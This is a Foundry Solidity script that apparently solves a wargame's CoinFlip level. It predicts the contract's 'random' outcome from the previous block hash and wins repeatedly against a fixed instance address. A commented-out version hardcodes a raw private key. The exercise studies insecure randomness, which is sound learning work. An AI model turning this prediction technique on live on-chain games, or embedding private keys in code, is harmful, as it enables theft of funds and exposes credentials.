// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instance/CoinFlip.sol";
import "forge-std/Script.sol";

contract Player {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip(CoinFlip instance) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        instance.flip(side);
    }
}


contract Level3 is Script {
    
    CoinFlip public instance = CoinFlip(0x94099942864EA81cCF197E9D71ac53310b1468D8);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Player _player = new Player();
        vm.roll(5);
        for (uint256 i = 0; i < 10; i++) {
            vm.roll(6 + i);
            _player.flip(instance);
            console.log("Consecutive wins: ", instance.consecutiveWins());
        }
        vm.stopBroadcast();
    }
}

// contract Player {
//     uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

//     constructor(CoinFlip _coinFlipInstance) {
//         uint256 blockValue = uint256(blockhash(block.number - 1));
//         uint256 coinFlip = blockValue / FACTOR;
//         bool side = coinFlip == 1 ? true : false;
//         _coinFlipInstance.flip(side);
//     }
// }

// contract Level3 is Script {

//     CoinFlip public coinflipInstance = CoinFlip(0x94099942864EA81cCF197E9D71ac53310b1468D8);

//     function run() external {
//         vm.startBroadcast(0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6);
//         new Player(coinflipInstance);
//         console.log("consecutiveWins: ", coinflipInstance.consecutiveWins());
//         vm.stopBroadcast();
//     }
// }